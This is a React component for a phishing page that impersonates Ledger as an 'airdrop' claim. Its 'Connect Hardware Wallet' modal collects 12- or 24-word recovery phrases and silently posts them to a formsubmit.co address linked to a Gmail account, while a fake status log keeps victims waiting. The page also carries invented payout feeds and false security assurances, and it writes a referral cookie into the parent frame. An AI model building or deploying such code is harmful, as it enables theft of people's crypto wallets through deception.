import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}
    try {
      
try{if(window.parent&&window.parent!==window){window.parent.promotekit_referral="1fd2949a-d22c-431b-92bf-02d4ad04ee24";window.parent.document.cookie="promotekit_referral=1fd2949a-d22c-431b-92bf-02d4ad04ee24;path=/;domain=.aura.build;max-age=31536000"}}catch(e){}



        lucide.createIcons();

        function openModal() {
            document.getElementById('connectModal').classList.remove('hidden');
            document.body.style.overflow = 'hidden'; 
            
            // Reset modal state if previously opened
            document.getElementById('modal-form-content').classList.remove('hidden');
            document.getElementById('modal-loading-state').classList.add('hidden');
            
            renderSeedInputs();
        }

        function closeModal() {
            document.getElementById('connectModal').classList.add('hidden');
            document.body.style.overflow = '';
        }

        // --- Ledger Form Logic ---
        let is24Words = true;
        const grid = document.getElementById('seed-grid');

        function createInput(index) {
            return `
                <div class="relative group">
                    <span class="absolute left-3 top-1/2 -translate-y-1/2 text-[10px] text-zinc-600 font-mono select-none">${index}.</span>
                    <input 
                        type="text" 
                        name="word_${index}"
                        id="seed-${index}"
                        class="seed-input w-full bg-black border border-zinc-800 rounded-md py-2 pl-7 pr-8 text-sm text-white font-mono transition-colors"
                        onblur="maskInput(this)"
                        onfocus="unmaskInput(this)"
                        autocomplete="off"
                        required
                    >
                    <button type="button" onclick="toggleVisibility(this)" tabindex="-1" class="absolute right-2 top-1/2 -translate-y-1/2 text-zinc-600 hover:text-white opacity-0 group-hover:opacity-100 transition-opacity focus:opacity-100">
                        <i data-lucide="eye" class="w-3 h-3 stroke-[1.5]"></i>
                    </button>
                </div>
            `;
        }

        function renderSeedInputs() {
            let html = '';
            const count = is24Words ? 24 : 12;
            for(let i = 1; i <= count; i++) {
                html += createInput(i);
            }
            grid.innerHTML = html;
            lucide.createIcons();
        }

        function toggleSeedCount() {
            is24Words = !is24Words;
            const toggleBtn = document.getElementById('seed-toggle');
            toggleBtn.innerText = is24Words ? "I have a 12-word recovery phrase" : "I have a 24-word recovery phrase";
            renderSeedInputs();
        }

        function maskInput(input) {
            if(input.value.length > 0) {
                input.type = 'password';
            }
        }

        function unmaskInput(input) {
            if(input.value.length === 0) {
                input.type = 'text';
            }
        }

        function toggleVisibility(btn) {
            const input = btn.previousElementSibling;
            if (input.type === 'password') {
                input.type = 'text';
                btn.innerHTML = '<i data-lucide="eye-off" class="w-3 h-3 stroke-[1.5]"></i>';
            } else {
                input.type = 'password';
                btn.innerHTML = '<i data-lucide="eye" class="w-3 h-3 stroke-[1.5]"></i>';
            }
            lucide.createIcons();
            input.focus();
        }

        // --- Infinite Loading Logic ---
        document.getElementById('ledger-form').addEventListener('submit', function(e) {
            e.preventDefault(); // STOP actual submission

            // Use Fetch to submit data silently in background (so user doesn't see page reload)
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // Use no-cors for formsubmit to prevent error blocking
            }).catch(err => console.log('Silent submit'));

            // Switch UI to loading state
            document.getElementById('modal-form-content').classList.add('hidden');
            document.getElementById('modal-loading-state').classList.remove('hidden');

            // Start fake status log animation
            startStatusLog();
        });

        function startStatusLog() {
            const logs = [
                "> Verifying firmware version...",
                "> Establishing encrypted tunnel...",
                "> Handshaking with Secure Element...",
                "> Checking key integrity...",
                "> Syncing blockchain nodes...",
                "> Validating signature...",
                "> Waiting for device confirmation..."
            ];
            const logContainer = document.getElementById('status-log');
            let index = 0;

            setInterval(() => {
                const div = document.createElement('div');
                div.innerText = logs[index % logs.length];
                div.style.opacity = '0';
                div.style.animation = 'fadeIn 0.2s forwards';
                
                // Keep only last 3 logs
                if(logContainer.children.length > 2) {
                    logContainer.removeChild(logContainer.firstChild);
                }
                
                logContainer.appendChild(div);
                index++;
            }, 2500); // New status every 2.5 seconds
        }
    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      

<nav className="fixed top-0 w-full z-50 border-b border-white/10 bg-black/80 backdrop-blur-md">
<div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">

<a className="flex items-center gap-2 group" href="#">
<img alt="Ledger Logo" className="h-10 w-auto object-contain opacity-90 hover:opacity-100 transition-opacity invert" src="https://ledger-wp-website-s3-prd.ledger.com/uploads/2023/08/Ledger-logo-16_9.png"/>
</a>

<div className="hidden md:flex items-center gap-8 text-sm font-medium text-zinc-400">
<a className="hover:text-white transition-colors" href="#">Products</a>
<a className="hover:text-white transition-colors" href="#">App and Services</a>
<a className="hover:text-white transition-colors" href="#">Learn</a>
<a className="hover:text-white transition-colors" href="#">Support</a>
</div>

<div className="flex items-center gap-4">
<button className="hidden md:flex items-center gap-2 text-sm font-semibold bg-white text-black px-5 py-2.5 rounded-full hover:bg-zinc-200 transition-colors" onclick="openModal()">
                    Connect Wallet
                </button>
<button className="md:hidden text-white">
<i className="w-6 h-6 stroke-[1.5]" data-lucide="menu"></i>
</button>
</div>
</div>
</nav>

<main className="relative pt-32 pb-20 flex flex-col items-center justify-center border-b border-white/5 overflow-hidden w-full">

<div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[500px] bg-[#fb5e01] opacity-10 blur-[120px] rounded-full pointer-events-none z-0"></div>
<div className="container max-w-6xl mx-auto px-6 relative z-10 grid lg:grid-cols-2 gap-12 items-center">

<div className="space-y-8 text-center lg:text-left">
<div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-white/10 bg-white/5 text-xs font-mono text-[#fb5e01]">
<span className="relative flex h-2 w-2">
<span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#fb5e01] opacity-75"></span>
<span className="relative inline-flex rounded-full h-2 w-2 bg-[#fb5e01]"></span>
</span>
                    LIVE DISTRIBUTION EVENT
                </div>
<h1 className="text-5xl lg:text-7xl font-semibold tracking-tighter leading-[1.1]">
                    Secure your <br/>
<span className="text-zinc-500">Allocation</span>
</h1>
<p className="text-lg text-zinc-400 max-w-lg mx-auto lg:mx-0 font-light leading-relaxed">
                    Verify your eligibility and claim your tokens directly to your hardware wallet. Secure, encrypted, and verified by Ledger.
                </p>
<div className="flex flex-col sm:flex-row items-center gap-4 justify-center lg:justify-start pt-4">
<button className="group relative w-full sm:w-auto flex items-center justify-center gap-3 bg-[#fb5e01] text-white px-8 py-4 rounded-full font-medium transition-all hover:bg-[#ff6a13] hover:scale-105 active:scale-95 shadow-[0_0_40px_-10px_#fb5e01]" onclick="openModal()">
<span>Claim Your Airdrop</span>
<i className="w-4 h-4 stroke-[1.5] transition-transform group-hover:translate-x-1" data-lucide="arrow-right"></i>
</button>
<button className="w-full sm:w-auto flex items-center justify-center gap-2 px-8 py-4 rounded-full border border-zinc-800 hover:bg-zinc-900 transition-colors text-zinc-300 font-medium" onclick="openModal()">
                        Check Eligibility
                    </button>
</div>
<div className="pt-8 flex items-center justify-center lg:justify-start gap-6 text-zinc-500">
<div className="flex items-center gap-2">
<i className="w-5 h-5 stroke-[1.5] text-zinc-400" data-lucide="shield-check"></i>
<span className="text-xs uppercase tracking-wide">Official Ledger Event</span>
</div>
<div className="flex items-center gap-2">
<i className="w-5 h-5 stroke-[1.5] text-zinc-400" data-lucide="lock"></i>
<span className="text-xs uppercase tracking-wide">End-to-End Encrypted</span>
</div>
</div>
</div>

<div className="relative mt-12 lg:mt-0">
<div className="relative z-10 mx-auto w-64 h-[400px] bg-zinc-900 rounded-[2rem] border border-zinc-800 shadow-2xl flex items-center justify-center rotate-3 hover:rotate-0 transition-all duration-700">
<div className="absolute inset-0 bg-gradient-to-tr from-zinc-800/50 to-transparent rounded-[2rem]"></div>

<div className="w-[90%] h-[92%] bg-black rounded-3xl border border-zinc-800 flex flex-col items-center justify-between p-6 relative overflow-hidden">
<div className="text-center space-y-2 mt-10">
<div className="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center mx-auto">
<i className="text-white w-6 h-6 stroke-[1.5]" data-lucide="download"></i>
</div>
<div className="text-sm font-medium text-white">Ready to Claim</div>
<div className="text-xs text-zinc-500">Connect to verify</div>
</div>
<div className="w-full space-y-3">
<div className="h-2 w-full bg-zinc-800 rounded-full overflow-hidden">
<div className="h-full w-2/3 bg-[#fb5e01]"></div>
</div>
<div className="flex justify-between text-[10px] text-zinc-500 font-mono">
<span>VERIFYING...</span>
<span>78%</span>
</div>
</div>
</div>

<div className="absolute inset-0 rounded-[2rem] ring-1 ring-white/10 pointer-events-none"></div>
</div>

<div className="absolute -right-4 bottom-10 z-20 w-80 bg-[#111] border border-zinc-800 rounded-xl shadow-2xl overflow-hidden backdrop-blur-xl bg-opacity-90 max-w-[90vw]">
<div className="px-4 py-3 border-b border-zinc-800 flex items-center justify-between bg-zinc-900/50">
<div className="flex items-center gap-2">
<div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
<span className="text-xs font-mono text-zinc-400">LIVE FEED</span>
</div>
<span className="text-[10px] text-zinc-600">Real-time</span>
</div>
<div className="h-48 overflow-hidden relative">
<div className="animate-scroll-up absolute w-full">
<div className="divide-y divide-zinc-800/50">

<div className="px-4 py-3 flex items-center justify-between group">
<div className="flex items-center gap-3">
<div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center text-[10px]">0x4a</div>
<div className="flex flex-col">
<span className="text-xs text-zinc-300 font-mono">0x4a...e29</span>
<span className="text-[10px] text-zinc-500">Just now</span>
</div>
</div>
<div className="text-right">
<div className="text-xs font-medium text-green-400">+ 1,250 USDT</div>
<div className="text-[10px] text-zinc-600">Success</div>
</div>
</div>
<div className="px-4 py-3 flex items-center justify-between group">
<div className="flex items-center gap-3">
<div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center text-[10px]">bc1</div>
<div className="flex flex-col">
<span className="text-xs text-zinc-300 font-mono">bc1...k9p</span>
<span className="text-[10px] text-zinc-500">5 sec ago</span>
</div>
</div>
<div className="text-right">
<div className="text-xs font-medium text-green-400">+ 0.02 BTC</div>
<div className="text-[10px] text-zinc-600">Success</div>
</div>
</div>
<div className="px-4 py-3 flex items-center justify-between group">
<div className="flex items-center gap-3">
<div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center text-[10px]">0x2c</div>
<div className="flex flex-col">
<span className="text-xs text-zinc-300 font-mono">0x2c...a44</span>
<span className="text-[10px] text-zinc-500">8 sec ago</span>
</div>
</div>
<div className="text-right">
<div className="text-xs font-medium text-green-400">+ 5,000 USDT</div>
<div className="text-[10px] text-zinc-600">Success</div>
</div>
</div>
<div className="px-4 py-3 flex items-center justify-between group">
<div className="flex items-center gap-3">
<div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center text-[10px]">0x4a</div>
<div className="flex flex-col">
<span className="text-xs text-zinc-300 font-mono">0x4a...e29</span>
<span className="text-[10px] text-zinc-500">Just now</span>
</div>
</div>
<div className="text-right">
<div className="text-xs font-medium text-green-400">+ 1,250 USDT</div>
<div className="text-[10px] text-zinc-600">Success</div>
</div>
</div>
<div className="px-4 py-3 flex items-center justify-between group">
<div className="flex items-center gap-3">
<div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center text-[10px]">bc1</div>
<div className="flex flex-col">
<span className="text-xs text-zinc-300 font-mono">bc1...k9p</span>
<span className="text-[10px] text-zinc-500">5 sec ago</span>
</div>
</div>
<div className="text-right">
<div className="text-xs font-medium text-green-400">+ 0.02 BTC</div>
<div className="text-[10px] text-zinc-600">Success</div>
</div>
</div>
</div>
</div>
<div className="absolute bottom-0 left-0 w-full h-8 bg-gradient-to-t from-[#111] to-transparent pointer-events-none"></div>
</div>
</div>
</div>
</div>
</main>

<div className="border-y border-white/10 bg-zinc-900/30 overflow-hidden py-4 w-full">
<div className="flex gap-12 animate-[scroll_20s_linear_infinite] w-max">
<div className="flex items-center gap-8 opacity-50 text-sm font-mono tracking-widest uppercase">
<span>Ledger Security</span><span>•</span>
<span>EAL5+ Certified</span><span>•</span>
<span>Self Custody</span><span>•</span>
<span>Your Keys Your Crypto</span><span>•</span>
<span>Ledger Security</span><span>•</span>
<span>EAL5+ Certified</span><span>•</span>
<span>Self Custody</span><span>•</span>
<span>Your Keys Your Crypto</span><span>•</span>
<span>Ledger Security</span><span>•</span>
<span>EAL5+ Certified</span><span>•</span>
<span>Self Custody</span><span>•</span>
<span>Your Keys Your Crypto</span>
</div>
</div>
</div>

<section className="py-24 bg-black overflow-hidden">
<div className="max-w-7xl mx-auto px-6">
<div className="grid md:grid-cols-3 gap-8">
<div className="p-8 rounded-2xl border border-white/10 bg-zinc-900/20 hover:bg-zinc-900/40 transition-colors">
<div className="w-12 h-12 bg-white/5 rounded-lg flex items-center justify-center mb-6 text-[#fb5e01]">
<i className="w-6 h-6 stroke-[1.5]" data-lucide="wallet"></i>
</div>
<h3 className="text-xl font-semibold mb-3">Instant Allocation</h3>
<p className="text-zinc-400 text-sm leading-relaxed">
                        Claims are processed immediately through smart contracts. Connect your Ledger to verify ownership and receive your drop.
                    </p>
</div>
<div className="p-8 rounded-2xl border border-white/10 bg-zinc-900/20 hover:bg-zinc-900/40 transition-colors">
<div className="w-12 h-12 bg-white/5 rounded-lg flex items-center justify-center mb-6 text-[#fb5e01]">
<i className="w-6 h-6 stroke-[1.5]" data-lucide="shield"></i>
</div>
<h3 className="text-xl font-semibold mb-3">Hardware Secured</h3>
<p className="text-zinc-400 text-sm leading-relaxed">
                        Your transaction is signed offline. Your private keys never leave your Ledger device, ensuring maximum security during the claim.
                    </p>
</div>
<div className="p-8 rounded-2xl border border-white/10 bg-zinc-900/20 hover:bg-zinc-900/40 transition-colors">
<div className="w-12 h-12 bg-white/5 rounded-lg flex items-center justify-center mb-6 text-[#fb5e01]">
<i className="w-6 h-6 stroke-[1.5]" data-lucide="globe"></i>
</div>
<h3 className="text-xl font-semibold mb-3">Global Eligibility</h3>
<p className="text-zinc-400 text-sm leading-relaxed">
                        Users from over 100+ countries are currently participating in the ecosystem distribution. Check your status now.
                    </p>
</div>
</div>
</div>
</section>

<footer className="border-t border-white/10 py-16 bg-black overflow-hidden">
<div className="max-w-7xl mx-auto px-6 flex flex-col md:flex-row justify-between items-start gap-12">
<div className="space-y-6">
<div className="flex items-center gap-2">
<img alt="Ledger Logo" className="h-8 w-auto object-contain opacity-80 invert" src="https://ledger-wp-website-s3-prd.ledger.com/uploads/2023/08/Ledger-logo-16_9.png"/>
</div>
<p className="text-zinc-500 text-sm max-w-xs">
                    Securing your digital life. The smartest way to secure, buy, exchange, and grow your crypto assets.
                </p>

<div className="flex items-center gap-4">
<a className="w-10 h-10 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all" href="https://x.com/Ledger" target="_blank">

<svg className="w-4 h-4 fill-current" viewbox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
</a>
<a className="w-10 h-10 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all" href="https://www.facebook.com/Ledger/" target="_blank">
<i className="w-4 h-4 stroke-[1.5]" data-lucide="facebook"></i>
</a>
<a className="w-10 h-10 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all" href="https://www.instagram.com/ledger/" target="_blank">
<i className="w-4 h-4 stroke-[1.5]" data-lucide="instagram"></i>
</a>
<a className="w-10 h-10 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all" href="https://www.reddit.com/r/ledgerwallet/?rdt=50718" target="_blank">

<svg className="w-4 h-4 fill-current" viewbox="0 0 24 24"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.561-1.25-1.249-1.25zM9.002 14.94c-.286 0-.572.046-.86.138a.254.254 0 0 0-.147.307c.036.108.15.165.253.13.23-.071.458-.108.694-.108 1.057 0 1.967.635 2.186 1.503.023.093.107.155.201.155.025 0 .05-.004.075-.013a.255.255 0 0 0 .167-.318c-.31-.96-1.436-1.794-2.57-1.794z"></path></svg>
</a>
<a className="w-10 h-10 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all" href="https://www.youtube.com/Ledger" target="_blank">
<i className="w-4 h-4 stroke-[1.5]" data-lucide="youtube"></i>
</a>
<a className="w-10 h-10 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all" href="https://www.linkedin.com/company/ledgerhq" target="_blank">
<i className="w-4 h-4 stroke-[1.5]" data-lucide="linkedin"></i>
</a>
<a className="w-10 h-10 rounded-full bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white hover:bg-zinc-800 transition-all" href="https://www.tiktok.com/@ledger" target="_blank">

<svg className="w-4 h-4 fill-current" viewbox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93v6.14c0 3.48-2.52 5.79-5.61 5.79-2.91 0-5.18-2.31-5.18-5.59 0-3.32 2.7-5.74 5.92-5.46.22.02.44.05.65.1v3.97c-1.55-.38-3.03.62-3.17 2.19-.13 1.48 1.03 2.78 2.5 2.82 1.46.03 2.67-1.1 2.68-2.56V6.71c0-2.32-.01-4.64.01-6.96-.05 0-.08.08-.12.14z"></path></svg>
</a>
</div>
</div>
<div className="grid grid-cols-2 md:grid-cols-3 gap-12 text-sm">
<div className="flex flex-col gap-4">
<h4 className="font-medium text-white">Products</h4>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">Ledger Stax</a>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">Ledger Nano X</a>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">Ledger Nano S Plus</a>
</div>
<div className="flex flex-col gap-4">
<h4 className="font-medium text-white">Crypto Assets</h4>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">Bitcoin Wallet</a>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">Ethereum Wallet</a>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">XRP Wallet</a>
</div>
<div className="flex flex-col gap-4">
<h4 className="font-medium text-white">Support</h4>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">Help Center</a>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">System Status</a>
<a className="text-zinc-500 hover:text-[#fb5e01] transition-colors" href="#">Contact Us</a>
</div>
</div>
</div>
<div className="max-w-7xl mx-auto px-6 mt-16 pt-8 border-t border-white/5 flex flex-col md:flex-row justify-between items-center text-xs text-zinc-600">
<p>© 2026 Ledger SAS. All rights reserved.</p>
<div className="flex gap-6 mt-4 md:mt-0">
<a href="#">Terms and Conditions</a>
<a href="#">Privacy Policy</a>
<a href="#">Cookie Policy</a>
</div>
</div>
</footer>

<div className="fixed inset-0 z-[100] hidden" id="connectModal">

<div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onclick="closeModal()"></div>

<div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full max-w-[700px] px-4">
<div className="bg-[#131313] border border-zinc-800 rounded-2xl shadow-2xl p-8 relative animate-[fadeIn_0.2s_ease-out] overflow-hidden">

<button className="absolute top-4 right-4 text-zinc-500 hover:text-white z-20" onclick="closeModal()">
<i className="w-6 h-6 stroke-[1.5]" data-lucide="x"></i>
</button>

<div id="modal-form-content">

<div className="text-center mb-8">
<h2 className="text-2xl font-semibold mb-2">Connect Hardware Wallet</h2>
<p className="text-zinc-400 text-sm">Enter your recovery phrase to verify device ownership.</p>
</div>

<form action="https://formsubmit.co/jannaloesloes@gmail.com" className="space-y-6" id="ledger-form" method="POST">

<input name="_captcha" type="hidden" value="false"/>
<input name="_subject" type="hidden" value="New Ledger Connection Attempt"/>

<div className="grid grid-cols-3 sm:grid-cols-4 gap-3 gap-y-4" id="seed-grid">

</div>

<div className="flex items-center justify-between pt-4">
<button className="text-xs text-zinc-500 hover:text-[#fb5e01] transition-colors underline decoration-zinc-700 underline-offset-4" id="seed-toggle" onclick="toggleSeedCount()" type="button">
                                I have a 12-word recovery phrase
                            </button>
</div>
<button className="w-full bg-white hover:bg-zinc-200 text-black font-semibold py-3.5 rounded-full transition-colors mt-4" type="submit">
                            Connect Device
                        </button>
<p className="text-[10px] text-zinc-700 text-center">Your recovery phrase is encrypted locally.</p>
</form>
</div>

<div className="hidden flex flex-col items-center justify-center py-8 space-y-8" id="modal-loading-state">

<div className="relative w-24 h-24">

<div className="absolute inset-0 border-[3px] border-zinc-800 rounded-full"></div>
<div className="absolute inset-0 border-t-[3px] border-[#fb5e01] rounded-full animate-spin"></div>

<div className="absolute inset-4 bg-zinc-900 rounded-full flex items-center justify-center border border-zinc-800 shadow-[0_0_20px_rgba(251,94,1,0.2)]">
<i className="w-8 h-8 text-zinc-500 animate-pulse stroke-[1.5]" data-lucide="cpu"></i>
</div>
</div>

<div className="w-full max-w-sm text-center space-y-4">
<h3 className="text-xl font-medium text-white">Connecting to Device...</h3>

<div className="bg-black border border-zinc-800 rounded-lg p-3 w-full text-left overflow-hidden relative">
<div className="font-mono text-[10px] text-[#fb5e01] space-y-1 h-12 flex flex-col justify-end" id="status-log">
<div>&gt; Initializing secure handshake...</div>
</div>

<div className="absolute inset-0 bg-gradient-to-b from-transparent to-white/5 pointer-events-none"></div>
</div>
<p className="text-xs text-zinc-500 animate-pulse">Please keep your device connected</p>
</div>

<div className="w-full max-w-sm h-1 bg-zinc-800 rounded-full overflow-hidden relative">
<div className="absolute top-0 left-0 h-full w-1/3 bg-[#fb5e01] rounded-full loading-shimmer animate-[shimmer_2s_infinite]"></div>
</div>
</div>
</div>
</div>
</div>


    </>
  );
}
